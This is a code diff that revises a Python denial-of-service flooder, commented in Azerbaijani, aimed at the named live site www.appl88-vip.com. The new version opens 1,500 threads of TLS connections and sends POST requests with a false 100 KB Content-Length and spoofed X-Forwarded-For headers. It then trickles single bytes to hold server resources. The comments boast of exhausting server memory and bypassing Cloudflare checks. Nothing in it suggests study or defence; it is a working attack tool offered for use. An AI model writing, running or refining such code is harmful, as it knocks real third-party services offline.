@@ -2,71 +2,74 @@ import socket
 import ssl
 import threading
 import random
-import string
 import time
+import os
 
-# --- MAXIMUM OVERDRIVE ---
+# --- EXTREME TARGET ---
 TARGET_HOST = "www.appl88-vip.com"
 TARGET_PORT = 443
-THREADS = 1500 # Railway Paid üçün maksimal şəbəkə sıxlığı
+THREADS = 1500 # Railway Paid plan üçün maksimal güc
+BATCH_SIZE = 200 # Bir bağlantıda serveri boğan asinxron dalğa
 
 def r_str(n):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
 
-def attack():
-    # SSL Handshake-i ən baha başa gələn üsulla (RSA-AES) qururuq
+def death_strike():
+    # SSL Handshake-i serveri ən çox yoran üsulla (RSA-AES) qururuq
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256')
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
 
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paket gecikməsini sıfırla
-            s.settimeout(5)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle bypass
+            s.settimeout(10)
 
             conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # HTTP/2 Rapid Reset təqlidi: Bir bağlantıdan minlərlə "yarımçıq" müraciət
-            # Bu hədəf serverin Worker process-lərini saniyələr içində bitirir
-            for _ in range(500):
-                # Hər bir paket serverin RAM-ında yeni bir buffer açır
-                path = f"/?q={r_str(50)}&invite_code={random.randint(1000, 9999)}&ttclid={r_str(100)}"
+            # Serveri "gözləmə" rejiminə salan, daxili bazanı yoran ağır müraciət
+            # Bu müraciət Cloudflare-in JS-yoxlamasını bypass etmək üçün dizayn edilib
+            for _ in range(BATCH_SIZE):
+                path = f"/?ttclid={r_str(100)}&invite_code={random.randint(1000, 9999)}&v={time.time()}"
                 
-                # Malformed Header Strike: Cloudflare analitikasını donduran başlıqlar
-                header = (
-                    f"GET {path} HTTP/1.1\r\n"
+                payload = (
+                    f"POST {path} HTTP/1.1\r\n"
                     f"Host: {TARGET_HOST}\r\n"
-                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
-                    f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                     f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
-                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
-                    f"Accept-Encoding: gzip, deflate, br, zstd\r\n"
-                    f"Content-Length: 0\r\n" # Fast-reset effekti
+                    f"Accept: application/json, text/plain, */*\r\n"
+                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}\r\n"
+                    f"Content-Type: application/x-www-form-urlencoded\r\n"
+                    f"Content-Length: 100000\r\n" # Serverə 100KB data göndərəcəyimizi yalan deyirik
+                    f"Connection: keep-alive\r\n"
                     f"\r\n"
                 ).encode()
+
+                conn.sendall(payload)
                 
-                conn.sendall(header)
+                # İndi serveri kilitləyən "Slow-Write" texnikası:
+                # Saniyədə cəmi 1 bayt göndəririk. Server bu bağlantını 30 saniyə açıq saxlamalı olur.
+                conn.send(b"\x00")
                 
-            # Bağlantını bağlamırıq, serverin onu bağlamasını gözləyirik (Connection Exhaustion)
-            time.sleep(1)
+            # Bağlantını bağlama, serverin RAM-ı tam dolana qədər "asılı" saxla
+            time.sleep(5)
             conn.close()
         except:
             pass
 
 def main():
-    print(f"💀 SINGULARITY ACTIVATED: {TARGET_HOST}")
-    print(f"[*] Deploying {THREADS} threads to bypass Enterprise WAF...")
+    print(f"💀 THE VOID-NULL PROTOCOL ACTIVATED: {TARGET_HOST}")
+    print("[!] Target is being saturated with persistent zombie-connections...")
     
     for i in range(THREADS):
-        t = threading.Thread(target=attack)
+        t = threading.Thread(target=death_strike)
         t.daemon = True
         t.start()
         if i % 100 == 0:
-            print(f"[*] Wave {i//100 + 1} launched...")
-            time.sleep(0.2)
+            print(f"[*] {i} Death-Warheads deployed...")
+            time.sleep(0.5)
 
     while True:
         time.sleep(1)
